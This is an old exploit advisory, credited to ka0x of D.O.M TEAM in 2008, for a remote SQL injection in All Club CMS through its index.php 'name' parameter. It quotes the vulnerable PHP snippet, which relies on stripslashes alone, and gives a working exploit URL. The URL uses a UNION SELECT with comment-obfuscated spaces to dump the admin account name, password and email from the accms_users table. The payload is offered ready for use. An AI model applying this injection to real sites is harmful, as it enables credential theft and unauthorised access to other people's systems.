All Club CMS <= 0.0.2 index.php Remote SQL Injection Vulnerability
==================================================================



-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 All Club CMS <= 0.0.1f index.php Remote SQL Injection Vulnerability
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


bug found by ka0x
D.O.M TEAM 2008
we are: ka0x, an0de, xarnuz
http://www.domlabs.org/

Script affected: All Club CMS
Vulnerability: Remote SQL Injection

need magic_quotes_gpc = off


vuln code:

[...]

if (isset($_GET[&#039;name&#039;]) && (!(empty($_GET[&#039;name&#039;])))) {
   
  $name = $_GET[&#039;name&#039;];
  $name = stripslashes($name);
  // stop hackers
  if (eregi("http\:\/\/", $name)) {
      echo "<br />&nbps;&nbps;No go on the hack attempt.<br />";
      // log attempt, from IP, etc.
      if ($SYS_SET[&#039;ban_attack_ip&#039;]) {
        // ban ip if ban_attack_ip
      }
    die();
  }
   
 
[...]


Stripslashes function only deletes backslashes (\) and the backslashes
doubles (\\) becomes simple (\).


Exploit:
http://[host]/accms_path/index.php?name=-1&#039;/**/union/**/select/**/1,concat(account,0x3a,password,0x3a,email),3,4,5,6,7,8,9,1,1,1,1/**/from/**/accms_users/**/where/**/id=1/*


__EOF__




